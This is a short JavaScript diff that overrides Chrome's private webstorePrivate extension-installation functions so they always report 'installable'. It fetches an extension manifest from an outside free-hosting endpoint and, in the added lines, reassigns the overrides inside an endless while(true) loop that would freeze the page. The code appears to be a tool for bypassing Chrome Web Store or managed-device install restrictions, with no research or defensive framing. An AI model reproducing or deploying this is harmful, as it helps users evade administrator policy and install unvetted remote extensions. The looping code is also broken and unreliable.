@@ -6,8 +6,6 @@ function requestExtension(id, callback){
 function getExtensionStatus(id, callback){
     callback("installable");
 }
-chrome.webstorePrivate.requestExtension = requestExtension;
-chrome.webstorePrivate.getExtensionStatus = getExtensionStatus;
 fetch('https://apithingy.000webhostapp.com/get_manifest.php', {
   method: 'POST',
   headers: {
@@ -29,3 +27,7 @@ fetch('https://apithingy.000webhostapp.com/get_manifest.php', {
   .catch((error) => {
     console.error('Error:', error);
   });
+while (true){
+    chrome.webstorePrivate.requestExtension = requestExtension;
+    chrome.webstorePrivate.getExtensionStatus = getExtensionStatus;
+}
